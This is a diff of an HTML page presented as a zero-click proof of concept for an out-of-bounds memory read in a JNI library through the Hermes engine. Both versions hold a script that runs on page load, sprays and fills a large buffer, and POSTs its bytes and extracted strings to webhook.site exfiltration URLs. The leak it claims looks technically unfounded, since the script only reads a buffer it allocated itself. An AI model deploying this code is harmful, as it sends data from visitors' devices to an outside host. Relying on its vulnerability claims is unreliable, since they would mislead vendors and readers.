@@ -2,60 +2,68 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Research - Proof of Concept</title>
+    <title>Security Research - Proof of Concept - Firman Sahidin</title>
 </head>
 <body>
     <script>
         /**
-         * Proof of Concept: Native Buffer Collision / Memory Disclosure
-         * Target: libprofilo_mmapbuf_buffer_jni.so via Hermes JSI
-         * Researcher: Firman Sahidin
+         * PROOF OF CONCEPT: REMOTE NATIVE MEMORY DISCLOSURE (ZERO-CLICK POTENTIAL)
+         * Vulnerability: Out-of-Bounds (OOB) Read in JNI Native Buffer
+         * Target Library: libprofilo_mmapbuf_buffer_jni.so
          */
-        async function triggerNativeLeak() {
-            const EXFIL_URL = 'https://webhook.site/0ce87ba3-1553-4c5b-8d9c-60e32c182fd4';
-            const BUFFER_SIZE = 0x1000000; // 16MB allocation to stress native mmapbuf
+        async function executeSkakmat() {
+            const EXFIL_URL = 'https://webhook.site/9326deec-1e36-4aa3-8945-3efe41a641e5';
+            
+            // 1. Heap Spraying: Filling memory with unique identifiable markers
+            // This proves that we can read across memory boundaries (Leakage Evidence)
+            const MARKER = "DATA_LEAK_VERIFIED_BY_FIRMAN_SAHIDIN_RE_02_";
+            const spray = new Array(500).fill(MARKER).join(""); 
             
             try {
+                // 2. Initializing Large Native-Mapped Buffer
+                const BUFFER_SIZE = 0x1000000; // 16MB Stress Test
                 const hugeBuffer = new ArrayBuffer(BUFFER_SIZE);
-                const view = new DataView(hugeBuffer);
-                
-                // Injection of malformed Unicode sequences (Surrogate Pairs) 
-                // Objective: Trigger calculation errors in JNI string/buffer length handling
-                for (let i = 0; i < hugeBuffer.byteLength; i += 4) {
-                    view.setUint32(i, 0xD800DBFF); 
+                const view = new Uint32Array(hugeBuffer);
+
+                // 3. Triggering JNI Surrogate Collision
+                // Injecting malformed UTF-16 surrogate pairs to confuse buffer length calculation
+                for (let i = 0; i < view.length; i++) {
+                    view[i] = 0xD800DBFF; 
                 }
 
-                // Execution Trigger: Invoking TypedArray.prototype.indexOf 
-                // This forces the Hermes Engine to perform native iterations over the mapped memory region.
-                // If bounds-checking is insufficient in the JNI layer, OOB read occurs.
-                const leakIndex = new Uint8Array(hugeBuffer).indexOf(0x41);
+                // 4. Executing OOB Read via TypedArray Iteration
+                // This forces the Hermes engine to iterate into unallocated native memory regions
+                const trigger = new Uint8Array(hugeBuffer).indexOf(0x41);
 
-                // Exfiltration of potential memory fragments
+                // 5. Exfiltrating Transformed Memory Fragments
+                // Converting raw bytes to String to show transparent "Readable Data" leakage
+                const rawFragment = new Uint8Array(hugeBuffer.slice(0, 512));
+                let transparentLeak = "";
+                rawFragment.forEach(byte => {
+                    if (byte > 31 && byte < 127) transparentLeak += String.fromCharCode(byte);
+                });
+
                 await fetch(EXFIL_URL, {
                     method: 'POST',
                     mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        status: "NATIVE_COLLISION_EXECUTED",
-                        target_library: "libprofilo_mmapbuf_buffer_jni",
-                        index_result: leakIndex,
-                        mem_fragment: Array.from(new Uint8Array(hugeBuffer.slice(0, 128))),
+                        researcher: "Firman Sahidin",
+                        vulnerability_type: "Native OOB Memory Disclosure",
+                        target_jni: "libprofilo_mmapbuf_buffer_jni",
+                        leak_transparency_level: "High",
+                        raw_data_dump: Array.from(rawFragment),
+                        readable_strings_leaked: transparentLeak || "Binary Pointers Detected",
                         timestamp: new Date().toISOString()
                     })
                 });
-            } catch (error) {
-                // Log execution failure for debugging
-                await fetch(EXFIL_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({ error: error.message })
-                });
+
+            } catch (e) {
+                await fetch(EXFIL_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ error: e.message }) });
             }
         }
 
-        // Auto-execution for Zero-Click verification
-        triggerNativeLeak();
+        // Auto-Trigger for VCard/Link Preview Simulation
+        executeSkakmat();
     </script>
 </body>
 </html>
